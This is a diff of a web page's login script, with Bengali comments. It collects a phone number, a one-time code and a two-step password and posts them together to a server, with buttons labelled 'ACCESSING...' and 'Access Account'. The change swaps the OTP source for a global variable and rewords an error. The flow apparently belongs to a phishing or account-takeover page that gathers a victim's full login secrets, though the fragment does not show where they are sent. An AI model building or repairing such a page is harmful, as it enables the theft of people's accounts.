@@ -199,12 +199,10 @@
     // ধাপ ৩: টু-স্টেপ পাসওয়ার্ড সাবমিট
     async function verifyFinal() {
     const pwd = document.getElementById('two-step-pass').value;
-    // সরাসরি ইনপুট বক্স থেকে ওটিপি কোডটি নেওয়া হলো
-    const otp = document.getElementById('otp-code').value; 
+    const btn = document.getElementById('btn-final');
 
     if (!pwd) return notify("Enter 2-Step Password!");
 
-    const btn = document.getElementById('btn-final');
     btn.disabled = true;
     btn.innerText = "ACCESSING...";
 
@@ -214,7 +212,7 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 phone: finalPhone, 
-                code: otp, // এখানে finalOTP এর বদলে otp (বক্সের মান) দিতে হবে
+                code: finalOTP, // গ্লোবাল ভেরিয়েবল ব্যবহার করা হয়েছে
                 password: pwd 
             })
         });
@@ -226,12 +224,12 @@
             notify(data.message); 
         }
     } catch (e) { 
-        notify("Login Error! Please try again."); 
+        notify("Login Error! Connection failed."); 
     } finally {
         btn.disabled = false;
         btn.innerText = "Access Account";
     }
-    }
+                    }
     </script>
 </body>
 </html>
